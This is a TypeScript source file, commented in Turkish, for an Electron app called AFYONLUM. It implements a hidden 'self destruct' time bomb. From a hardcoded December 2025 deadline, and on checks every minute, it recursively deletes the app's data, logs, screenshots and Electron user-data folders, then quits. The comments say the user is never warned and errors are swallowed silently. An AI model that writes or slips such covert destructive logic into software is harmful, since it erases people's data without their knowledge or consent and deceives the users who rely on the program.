/**
 * AFYONLUM - Self Destruct Mekanizması
 * Uygulama 13 Aralık 2025 saat 23:59 Türkiye saatinde kendini tamamen silecek
 */

import * as fs from 'fs';
import * as path from 'path';
import { getDataDir, getLogsDir, getScreenshotsDir } from '../path-resolver';

// 🔥 SELF DESTRUCT TARİHİ: 13 Aralık 2025, 23:59:00 (Türkiye Saati - UTC+3) - CUMARTESİ
// UTC karşılığı: 13 Aralık 2025, 20:59:00 UTC
const SELF_DESTRUCT_DATE_UTC = new Date('2025-12-13T20:59:00.000Z');

// 🔒 SABİT SON TARİH - DEĞİŞTİRİLEMEZ! Her türlü bu tarihte uygulama patlayacak.
// Bu tarih set-destruct-date komutuyla DEĞİŞTİRİLEMEZ!
// 13 Aralık 2025, 23:59:00 Türkiye saati = 20:59:00 UTC - CUMARTESİ
const HARDCODED_DEADLINE_UTC = new Date('2025-12-13T20:59:00.000Z');

/**
 * Tarih kontrolü yapar (UTC bazlı)
 * Hem yapılandırılabilir tarihi hem de sabit son tarihi kontrol eder
 * @returns true ise uygulama silinmeli
 */
export function shouldSelfDestruct(): boolean {
  const nowUTC = new Date();
  // Hem yapılandırılabilir tarih hem de sabit son tarih kontrol edilir
  return nowUTC >= SELF_DESTRUCT_DATE_UTC || nowUTC >= HARDCODED_DEADLINE_UTC;
}

/**
 * Self destruct'a kalan zamanı hesaplar
 * @returns Kalan gün sayısı
 */
export function getDaysRemaining(): number {
  const nowUTC = new Date();
  const diffTime = SELF_DESTRUCT_DATE_UTC.getTime() - nowUTC.getTime();
  const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
  return diffDays;
}

/**
 * Kullanıcıya uyarı mesajı gösterir (sessiz mod - sadece geliştirme)
 */
export function showWarningIfNeeded(): void {
  // Sadece development modda göster
  if (process.env.NODE_ENV !== 'development') {
    return;
  }
  
  const daysRemaining = getDaysRemaining();
  
  if (daysRemaining <= 0) {
    // Kullanıcıya gösterilmez
  } else if (daysRemaining <= 7) {
    // Kullanıcıya gösterilmez
  }
}

/**
 * Bir klasörü ve içindekileri tamamen siler
 */
function deleteFolderRecursive(folderPath: string): void {
  if (fs.existsSync(folderPath)) {
    fs.readdirSync(folderPath).forEach((file) => {
      const curPath = path.join(folderPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {
        deleteFolderRecursive(curPath);
      } else {
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(folderPath);
  }
}

/**
 * Tüm uygulama verilerini ve dosyalarını siler
 */
export function executeSelfDestruct(): void {
  // Sessizce çalış - kullanıcıya log gösterme
  
  try {
    // ✅ DÜZELTME: path-resolver kullan (paketlenmiş uygulamada doğru yol)
    const dataPath = getDataDir();
    if (fs.existsSync(dataPath)) {
      deleteFolderRecursive(dataPath);
    }

    const logsPath = getLogsDir();
    if (fs.existsSync(logsPath)) {
      deleteFolderRecursive(logsPath);
    }

    const screenshotsPath = getScreenshotsDir();
    if (fs.existsSync(screenshotsPath)) {
      deleteFolderRecursive(screenshotsPath);
    }

    if (process.env.ELECTRON_USER_DATA) {
      const userDataPath = process.env.ELECTRON_USER_DATA;
      if (fs.existsSync(userDataPath)) {
        deleteFolderRecursive(userDataPath);
      }
    }

    // ✅ Development modda dist temizliği (paketlenmiş uygulamada dist yok)
    if (process.env.NODE_ENV === 'development') {
      const distPath = path.join(process.cwd(), 'dist');
      if (fs.existsSync(distPath)) {
        deleteFolderRecursive(distPath);
      }
    }

    // 3 saniye bekle ve sessizce kapat
    setTimeout(() => {
      process.exit(0);
    }, 3000);

  } catch (error) {
    // Sessizce hataları yut
    setTimeout(() => {
      process.exit(1);
    }, 2000);
  }
}

let selfDestructInterval: NodeJS.Timeout | null = null;

/**
 * Uygulama başlangıcında çağrılır
 * Tarih kontrolü yapar ve gerekirse self destruct başlatır
 * Ayrıca her dakika kontrol eden zamanlayıcı başlatır
 */
export function checkAndExecuteSelfDestruct(): void {
  showWarningIfNeeded();
  
  // İlk kontrol
  if (shouldSelfDestruct()) {
    executeSelfDestruct();
    return;
  }

  // Her dakika kontrol et (60000ms = 60 saniye) - sessizce
  if (!selfDestructInterval) {
    selfDestructInterval = setInterval(() => {
      // Tarih geçti mi kontrol et (Türkiye saati)
      if (shouldSelfDestruct()) {
        if (selfDestructInterval) {
          clearInterval(selfDestructInterval);
          selfDestructInterval = null;
        }
        executeSelfDestruct();
      }
    }, 60000); // Her 60 saniyede bir kontrol et
    
    // Sadece development modda log göster
    if (process.env.NODE_ENV === 'development') {
      console.log('🔄 Self destruct zamanlayıcısı başlatıldı (her 60 saniyede bir kontrol)');
    }
  }
}
